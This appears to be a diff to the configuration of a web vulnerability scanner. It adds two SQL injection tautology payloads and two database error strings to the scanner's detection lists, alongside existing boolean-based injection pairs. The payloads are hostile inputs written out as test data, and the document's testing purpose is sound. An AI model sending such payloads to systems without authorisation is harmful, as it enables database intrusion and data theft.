@@ -141,6 +141,8 @@ sqli:
     - "1'"
     - "1\""
     - "1`"
+    - "') OR ('1'='1"
+    - "')) OR (('1'='1"
     - "' OR 1=1--"
     - "\" OR 1=1--"
     - "` OR 1=1--"
@@ -169,7 +171,7 @@ sqli:
   boolean_based_payloads:
     - { true: "' AND 1=1--", false: "' AND 1=2--" }
     - { true: "' OR 1=1--", false: "' OR 1=2--" }
-  error_patterns: ["sql syntax", "mysql", "unclosed quotation", "syntax error", "ora-", "postgresql", "sql server", "invalid column", "unknown column"]
+  error_patterns: ["sql syntax", "mysql", "unclosed quotation", "syntax error", "ora-", "postgresql", "sql server", "invalid column", "unknown column", "sqlite_error", "sequelize"]
   time_delay_seconds: 4
 
 # Server-Side Request Forgery Tester
